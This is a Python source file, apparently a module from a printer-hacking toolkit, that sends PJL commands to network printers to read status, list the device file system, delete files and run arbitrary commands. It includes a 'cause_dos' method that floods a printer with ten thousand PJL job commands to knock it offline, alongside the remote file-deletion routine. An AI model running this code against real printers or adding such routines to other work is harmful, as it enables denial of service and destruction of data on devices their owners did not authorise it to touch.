import re, socket

class PJLModule:
    def __init__(self, connection):
        self.connection = connection

    def send_command(self, command):
        self.connection.sendall(command.encode('utf-8'))
        data = b""
        self.connection.settimeout(2)
        try:
            while True:
                chunk = self.connection.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        return data.decode('latin1', errors='ignore')

    def get_status(self, raw_output):
        display = re.findall(r'DISPLAY\d*\s*=\s*"(.*?)"', raw_output)
        code = re.findall(r'CODE\d*\s*=\s*(\d+)', raw_output)
        return {
            "display": display[0] if display else None,
            "code": code[0] if code else None
        }

    def list_files(self, raw_output):
        dirs = re.findall(r'^(.*)\s+TYPE\s*=\s*DIR$', raw_output, re.MULTILINE)
        files = re.findall(r'^(.*)\s+TYPE\s*=\s*FILE', raw_output, re.MULTILINE)
        return {"dirs": dirs, "files": files}

    def delete_file(self, filename):
        cmd = f"@PJL FSDELETE NAME=\"{filename}\"\r\n"
        return self.send_command(cmd)

    def cause_dos(self):
        payload = "@PJL JOB NAME=REAPER\r\n@PJL EOJ\r\n" * 10000
        return self.send_command(payload)

    def run(self, cmd):
    # Handle known aliases
        if cmd == "status":
            raw = self.send_command("@PJL INFO STATUS\r\n")
            print("[RAW OUTPUT]")
            print(raw)
            return self.get_status(raw)

        elif cmd == "ls":
            raw = self.send_command("@PJL FSDIRLIST NAME=\"0:\\\" ENTRY=1 COUNT=100\r\n")
            print("[RAW OUTPUT]")
            print(raw)
            return self.list_files(raw)

        else:
            # Assume custom PJL command
            raw = self.send_command(cmd if cmd.endswith("\r\n") else f"{cmd}\r\n")
            print("[RAW OUTPUT]")
            print(raw)
            return raw